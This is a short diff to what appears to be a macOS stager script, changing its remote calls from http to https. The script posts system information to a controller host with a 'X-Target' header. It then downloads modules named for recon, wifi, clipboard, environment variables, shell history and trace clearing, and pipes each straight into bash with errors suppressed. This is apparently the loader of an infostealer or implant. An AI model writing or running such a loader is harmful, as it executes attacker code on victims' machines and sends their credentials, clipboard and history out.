@@ -27,7 +27,7 @@ ram      : ${RAM} GB
 time     : $TIME"
 
 # --- POST sysinfo ---
-curl -s -X POST "http://$H:$P/store/init" \
+curl -s -X POST "https://$H:$P/store/init" \
      -H "Authorization: $AU" \
      -H "Content-Type: text/plain" \
      -H "X-Target: $TH" \
@@ -37,5 +37,5 @@ curl -s -X POST "http://$H:$P/store/init" \
 PAYLOADS="recon_mac.sh wifi_mac.sh clipboard_mac.sh envvars_mac.sh history_mac.sh custom_mac.sh clearance_mac.sh mom_mac.sh"
 
 for FILE in $PAYLOADS; do
-    bash <(curl -s -H "Authorization: $AU" "http://$H:$P/moduls/$FILE") 2>/dev/null || true
+    bash <(curl -s -H "Authorization: $AU" "https://$H:$P/moduls/$FILE") 2>/dev/null || true
 done
